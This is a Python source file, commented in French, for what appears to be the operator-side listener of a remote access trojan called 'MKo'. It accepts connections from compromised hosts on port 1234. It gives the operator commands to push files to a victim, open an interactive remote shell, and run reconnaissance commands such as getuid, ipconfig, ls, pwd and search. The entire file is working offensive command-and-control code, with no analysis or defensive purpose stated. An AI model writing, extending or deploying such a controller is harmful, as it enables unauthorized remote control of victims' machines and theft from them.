import lib
import socket
import threading
import os


def handle_client(conn, addr):
    print(f"[+] Connexion établie avec {addr[0]}:{addr[1]}")
    conn.send(b"Welcome, you are now connected !")
    while True:
        command = input("MKo > ")
        if command == "exit":
            break

        if command == "help" or command == "?":
            lib.print_help()
            continue

        if command.startswith("upload"):
            file_path = command.split(" ")[1]
            if not os.path.isfile(file_path):
                print(f"Le fichier {file_path} n'existe pas.")
                continue

            print(f"Uploading {file_path}...")
            conn.send(command.encode('utf-8'))

            file_size = os.path.getsize(file_path)
            conn.send(file_size.to_bytes(8, 'big'))
            print(f"Sent file size: {file_size} bytes")

            with open(file_path, "rb") as file:
                while (chunk := file.read(1024)):
                    conn.send(chunk)

            print("File uploaded successfully")

        if command == "shell":
            conn.send(command.encode('utf-8'))
            while True:
                command = input("MKo (shell) > ")
                if command == "exit":
                    conn.send(command.encode('utf-8'))
                    break

                conn.send(command.encode('utf-8'))
                output = conn.recv(4096).decode('utf-8')
                print(output)

        if command == "getuid":
            conn.send(command.encode('utf-8'))
            output = conn.recv(1024).decode('utf-8')
            print(output)

        if command == "ipconfig":
            conn.send(command.encode('utf-8'))
            output = conn.recv(4096).decode('utf-8')
            print(output)

        if command == "ls":
            conn.send(command.encode('utf-8'))
            output = conn.recv(4096).decode('utf-8')
            print(output)

        if command == "pwd":
            conn.send(command.encode('utf-8'))
            output = conn.recv(1024).decode('utf-8')
            print(output)

        if command.lower().startswith("search"):
            conn.send(command.encode('utf-8'))
            output = conn.recv(4096).decode('utf-8')
            print(output)

        if command == "":
            print("help or ? to display help")
            print("you can also use ? <command> to get help on a specific command")
            print("\n")
            continue

        # else:
        #     conn.send(command.encode('utf-8'))
        #     output = conn.recv(4096).decode('utf-8')
        #     print(output)

    conn.close()


host = '0.0.0.0'
port = 1234

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print(f"[+] En attente de connexion sur le port {port}...")
while True:
    conn, addr = s.accept()
    thread = threading.Thread(target=handle_client, args=(conn, addr))
    thread.start()

    # afficher le nombre de threads actifs
    print(f"[+] Threads actifs: {threading.active_count() - 1}")
